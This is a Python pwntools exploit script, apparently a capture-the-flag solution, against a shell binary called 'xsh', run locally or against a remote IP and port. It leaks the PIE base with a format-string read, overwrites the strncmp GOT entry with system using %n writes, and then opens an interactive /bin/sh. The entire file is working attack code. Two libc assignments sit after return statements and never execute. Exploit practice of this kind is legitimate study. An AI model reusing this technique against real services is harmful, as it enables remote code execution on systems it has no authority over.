#!/usr/bin/env python2

from pwn import *

elf = ELF('./xsh')
libc = ELF('./libc.so.6')

def start():
    if not args.REMOTE:
        return process('./xsh')
        libc = ELF('./libc.so.6')
    else:
        return remote('35.192.206.226', 5555)
        libc = ELF('./libc-remote.so.6')

def execute(cmd):
    p.recv()
    p.sendline(cmd)
    return p.recvuntil('$')

context.terminal = ['tmux', 'new-window']
p = start()
if args.GDB:
    gdb.attach(p)

# Get base address of binary
leak = execute('echo 0x%3$x')[:10]
elf.address = int(leak, 16) - 0x1249
strncmp_got = elf.got['strncmp']
system = elf.plt['system']

log.info('PIE base: ' + hex(elf.address))
log.info('strncmp_got: ' + hex(strncmp_got))
log.info('system: ' + hex(system))

# Prepare to write system to strncmp_got
# Calculate each half of the address
# This is to prevent the exploit from taking way too long to write a huge address
first = int('0x' + hex(system)[-4:], 16)
second = int(hex(system)[:6], 16)

# Do the format string overwrite
payload = 'echo' + p32(strncmp_got) + p32(strncmp_got+2)
payload += '%{}c%24$n%{}c%25$n'.format(first-4-3, second-first)
execute(payload)

# Execute /bin/sh for shell
p.recv()
p.sendline('/bin/sh')

p.interactive()
